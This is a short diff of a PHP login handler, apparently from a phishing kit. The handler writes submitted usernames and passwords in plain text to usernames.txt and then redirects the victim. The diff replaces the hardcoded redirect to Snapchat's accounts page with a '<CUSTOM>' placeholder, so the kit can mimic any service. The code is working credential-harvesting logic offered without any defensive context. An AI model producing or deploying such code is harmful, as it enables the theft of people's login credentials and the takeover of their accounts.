@@ -21,7 +21,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   }  else {
     include 'ip.php';
     file_put_contents("usernames.txt", "[username]: " . $_POST['username'] . " [password]: " . $_POST['password'] . "\n", FILE_APPEND);
-    header('Location: https://accounts.snapchat.com'); 
+    header('Location: <CUSTOM>'); 
   }
      
 }
